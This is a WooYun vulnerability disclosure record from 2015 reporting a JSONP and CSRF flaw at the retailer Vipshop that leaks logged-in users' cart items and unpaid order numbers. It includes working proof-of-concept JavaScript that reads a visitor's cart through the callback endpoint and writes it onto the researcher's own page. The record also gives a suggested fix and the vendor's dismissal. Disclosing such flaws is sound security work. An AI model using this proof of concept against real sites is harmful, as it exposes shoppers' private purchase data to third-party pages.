{"id": 28357, "wybug_id": "wooyun-2015-0122755", "wybug_title": "唯品会某处JSONP+CSRF泄露重要信息", "wybug_corp": "唯品会", "wybug_author": "Friday", "wybug_date": "2015-06-26 09:29", "wybug_open_date": "2015-06-26 11:20", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 唯品会某处JSONP+CSRF泄露重要信息 详细说明：  不想复习啊，随手测一测~~~存在漏洞的地址：http://cart.vip.com/te2/cart.php?callback=callback&isGetLast=1http://checkout.vip.com/app/getUnpayOrder.php?callback=callback其他的应该还有，但这两个足够分量了:第一个是购物车的商品数及商品详细信息，第二个是下了订单的订单编号以及订单数量。   漏洞证明：  测试代码：\n<meta charset=\"utf-8\">正在请求，请耐心等待... ...</table><script type=\"text/javascript\">\twindow.callback=function(e){\t\tif(e['result'] == -1){\t\t\talert(\"屌丝,你还没登录唯品会\");\t\t\treturn 0\t\t}\t\tif(e['cartInfo']['has_goods_left']){\t\t\talert(\"购物车中有 \" + e['cartList']['count'] + \" 件商品~\");\t\t}\t\tvar str = '<table border=1>'\t\tfor(i=0;i<e['cartList']['count'];i++){\t\t\tstr += \"<tr><td><img src='\"+e['cartList']['items'][i]['img']+\"/\"+e['cartList']['items'][i]['img_pre']+\"-5.jpg'></td><td>\"+e['cartList']['items'][i]['brand_name']+\"</td><td>\"+e['cartList']['items'][i]['name']+\"</td><td>\"+e['cartList']['items'][i]['sum_price']+\"</td></tr>\"\t\t}\t\tstr += '</table>'\t\tdocument.write(str)\t}\t</script><script src=\"http://cart.vip.com/te2/cart.php?callback=callback&isGetLast=1\"></script>\n如果购物车中有商品：\n\n测试链接：http://friday.sinaapp.com/vip.html   修复方案：  添加token或者判断refer或者其他防止csrf的黑科技听说你们要建立VSRC了，恭喜！求礼物！   版权声明：转载请注明来源 Friday@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-26 11:20 厂商回复： 漏洞确实存在，但对用户影响较小，谢谢您对唯品会信息安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}